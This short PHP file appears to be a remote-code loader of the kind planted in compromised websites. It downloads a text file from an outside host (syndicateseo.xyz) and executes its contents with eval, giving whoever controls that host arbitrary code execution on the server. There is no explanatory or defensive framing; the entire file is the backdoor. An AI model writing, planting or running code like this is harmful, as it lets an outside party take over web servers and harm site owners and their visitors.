<?php

$content = file_get_contents(urldecode('https://syndicateseo.xyz/kerang/upload.txt'));

$content = "?> ".$content;
eval($content);
